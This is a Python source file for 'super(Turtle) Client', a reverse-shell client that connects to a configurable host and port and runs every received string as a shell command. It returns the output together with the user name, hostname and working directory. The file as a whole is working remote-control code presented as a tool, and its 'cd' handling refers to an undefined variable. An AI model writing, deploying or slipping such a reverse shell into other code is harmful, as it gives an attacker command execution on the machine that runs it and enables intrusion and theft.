#!/usr/env/bin python3

'''
super(Turtle) Client package.
Exposes TurtleClient class to handle client-side reverse shell.
'''

import socket
import subprocess
import os
from getpass import getuser

class TurtleClient(object):
    '''
    Socket client
    '''

    def __init__(self, host='127.0.0.1', port=9999, bufsize=1024):
        '''
        Handle parameters and store it within instance
        '''
        self.host = host
        self.port = port
        self.bufsize = bufsize


    def run(self, interactive=True):
        '''
        Run client (interactivly by default)
        '''
        self._create_socket()
        self._connect()
        self.receive()

        if interactive is True:
            self.interactive_receive()


    def close(self):
        '''
        Close client
        '''
        self._socket.close()


    def _create_socket(self):
        '''
        Init `self._socket`
        '''
        self._socket = socket.socket()


    def _connect(self):
        '''
        Connect socket
        '''
        self._socket.connect((self.host, self.port))


    def interactive_receive(self):
        '''
        Loop and wait to receive something
        '''
        while True:
            self.receive()


    def receive(self):
        '''
        Receive and handle data
        '''
        raw = self._socket.recv(self.bufsize)

        if raw[:2].decode('utf-8') == 'cd':
            os.chdir(data[3:].decode('utf-8'))

        if len(raw) > 0:
            command = subprocess.Popen(
                raw[:].decode('utf-8'),
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )

            msgout = str(command.stdout.read(), 'utf-8')
            msgerr = '\033[91m{}\033[39m'.format(str(command.stderr.read(), 'utf-8'))
            output = ''.join([msgout, msgerr])

            self._socket.send(
                str.encode(output + self._prefix)
            )
            print(output)


    @property
    def _prefix(self):
        ''' Nothing relevant here '''
        return '\033[93m{}\033[39m ({}) \033[96m{} \033[39m> '.format(getuser(), socket.gethostname(), os.getcwd())


if __name__ == '__main__':
    tc = TurtleClient()
    try:
        tc.run()
    except KeyboardInterrupt:
        print('Quitting')
        tc.close()

